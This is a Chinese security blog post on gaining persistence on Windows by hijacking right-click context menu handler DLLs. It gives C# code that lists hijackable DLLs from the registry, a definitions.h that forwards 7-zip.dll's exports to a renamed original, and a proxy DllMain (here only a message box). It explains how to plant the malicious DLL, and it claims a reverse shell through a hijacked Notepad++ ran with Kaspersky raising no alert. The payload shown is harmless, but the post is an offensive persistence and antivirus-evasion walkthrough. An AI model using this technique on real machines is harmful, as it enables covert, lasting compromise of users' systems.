<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> DLL劫持右键菜单实现持久化 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="DLL劫持右键菜单实现持久化 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">DLL劫持右键菜单实现持久化</h1><div class="post-time">Apr 13, 2020</div><div class="post-content"><h3><span id="dll代理">DLL代理</span></h3><p>如下图，DLL代理是通过创建一个恶意的DLL来替换原有程序的DLL，同时不删除原有程序的DLL，将其重命名。恶意的DLL在被调用的时候会运行恶意的代码功能，并把原有的DLL功能部分转发给原始DLL，这样更好的确保原有程序的功能正常运行且不被迫坏。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780770334.png" alt="1586780770334"></p>
<h3><span id="右键菜单注册表">右键菜单注册表</span></h3><p>注册表路径：HKLM\Software\Classes*\ShellEx\ContextMenuHandlers</p>
<p>利用<code>autoruns</code>可以查看此注册表路径中加载的DLL文件。</p>
<p>同样也可以对其他自启动注册表里的dll文件进行劫持。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586762524303.png" alt=""></p>
<p>我们可以用<code>C#</code>实现一个小程序来读取可劫持的DLL。代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">using Microsoft.Win32;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace dll</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            GetKey(@&quot;Software\Classes\*\ShellEx\ContextMenuHandlers\&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static void GetKey(string path)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))</span><br><span class="line">            &#123;</span><br><span class="line">                if (key != null)</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    string[] rk = key.GetSubKeyNames();</span><br><span class="line">                    foreach (var item in rk)</span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        string value = GetRegistryValue(path + item);</span><br><span class="line">                        string imgpath = GetrootValue(@&quot;CLSID\&quot; + value + @&quot;\InprocServer32\&quot;);</span><br><span class="line">                        if (imgpath != null &amp;&amp; imgpath != &quot;&quot;)</span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine(imgpath);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        protected static string GetRegistryValue(string path)</span><br><span class="line">        &#123;</span><br><span class="line">            string value = string.Empty;</span><br><span class="line">            RegistryKey root = Registry.LocalMachine;</span><br><span class="line">            RegistryKey rk = root.OpenSubKey(path);</span><br><span class="line">            if (rk != null)</span><br><span class="line">            &#123;</span><br><span class="line">                value = (string)rk.GetValue(&quot;&quot;, null);</span><br><span class="line">            &#125;</span><br><span class="line">            return value;</span><br><span class="line">        &#125;</span><br><span class="line">        protected static string GetrootValue(string path)</span><br><span class="line">        &#123;</span><br><span class="line">            string value = string.Empty;</span><br><span class="line">            RegistryKey root = Registry.ClassesRoot;</span><br><span class="line">            RegistryKey rk = root.OpenSubKey(path);</span><br><span class="line">            if (rk != null)</span><br><span class="line">            &#123;</span><br><span class="line">                value = (string)rk.GetValue(&quot;&quot;, null);</span><br><span class="line">            &#125;</span><br><span class="line">            return value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780654385.png" alt="1586780654385"></p>
<h3><span id="创建一个代理的dll">创建一个代理的DLL</span></h3><p>这里用到一个开源的项目。</p>
<p><a href="https://github.com/rek7/dll-hijacking" target="_blank" rel="noopener">https://github.com/rek7/dll-hijacking</a></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780811272.png" alt="1586780811272"></p>
<p>生成的<code>definitions.h</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">7-zip.dll - 8664 machine (x64)</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/export:DllCanUnloadNow=7-zip_.DllCanUnloadNow,@1&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/export:DllGetClassObject=7-zip_.DllGetClassObject,@2&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/export:DllRegisterServer=7-zip_.DllRegisterServer,@3&quot;)</span><br><span class="line">#pragma comment(linker,&quot;/export:DllUnregisterServer=7-zip_.DllUnregisterServer,@4&quot;)</span><br></pre></td></tr></table></figure>
<p>替换<code>definitions.h</code>头文件，作者项目的代码里是用的<code>powershell</code>来反弹shell。代码好像有点问题，我这里修改代码进行简单的弹框测试。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://itm4n.github.io/dll-proxying/</span></span><br><span class="line"><span class="comment">https://www.codeproject.com/Articles/17863/Using-Pragmas-to-Create-a-Proxy-DLL</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">to implement: hooking specific functions</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"definitions.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Ws2_32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hinstDLL,  <span class="comment">// handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason,     <span class="comment">// reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved)</span>  <span class="comment">// reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">			MessageBox(<span class="literal">NULL</span>, <span class="string">"Zero Team"</span>, <span class="string">"Zero team"</span>, MB_OK);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// Successful DLL_PROCESS_ATTACH.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="劫持程序右键菜单">劫持程序右键菜单</span></h3><p>编译生成恶意的DLL命名为<code>7-zip.dll</code>，并将原有DLL改名为<code>7-zip_.dll</code>。当我们右键单击程序时，即可运行恶意的DLL。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780745270.png" alt="1586780745270"></p>
<h3><span id="拓展">拓展</span></h3><p>作者项目里的反弹shell，测试不能成功。我们可以自己用C语言写一个反弹shell的功能，或者加载shellcode。</p>
<p>如下为在装有卡巴斯基的机器上测试劫持<code>notepad++</code>。成功劫持，并反弹shell，且卡巴斯基未告警。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780727660.png" alt="1586780727660"></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1586780693681.png" alt="1586780693681"></p>
<p>反弹shell demo流量未加密，最好不要在实战中使用，dll内容可以自己发挥。</p>
<h3><span id="reference">Reference</span></h3><p><a href="https://b.ou.is/articles/2020-03/context-menu-persistance" target="_blank" rel="noopener">https://b.ou.is/articles/2020-03/context-menu-persistance</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/SweetPotato Webshell下执行命令版.html" class="prev">上一篇</a><a href="/posts/notes/加载远程XSL文件的宏免杀方法.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2024 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>